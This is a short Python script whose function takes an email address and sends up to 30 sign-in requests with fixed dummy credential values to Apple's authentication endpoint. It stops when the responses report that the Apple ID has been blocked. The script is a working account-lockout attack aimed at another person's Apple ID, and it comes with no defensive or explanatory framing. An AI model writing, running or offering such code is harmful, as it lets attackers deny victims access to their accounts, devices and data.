import requests

async def lock(email):
    message = ''
    for i in range(30):
        url = "https://idmsa.apple.com/appleauth/auth/signin/complete?isRememberMeEnabled=true"
        headers = {"accept": "application/json, text/javascript, */*; q=0.01"}
        data = {
            "accountName": email,
            "m1": "VLf+kATmelukfkPZ6QMqtus7Te9X/drCzqwSImXkmhI=",
            "c": "d-3f7-603d13cf-b9a2-11ee-a972-9f34655beab5:MSA",
            "m2": "foaIN0P9/MJv0k/jZb0dLFS/14gYLtV50c8VXcLRUOc="
        }

        response = requests.post(url, json=data, headers=headers)
        if response.status_code == 503:
            return '503 Service Temporarily Unavailable'
        
        data = response.json()
        message = data["serviceErrors"][0]["message"]
        print(message)
        
        if 'Access denied' in message:
            return 'Access denied. Your account does not have permission to access this application.'
        if 'This Apple ID has been' in message:
            return 'Apple ID has been blocked.'
    return '30 requests sent. Failed to block Apple ID.'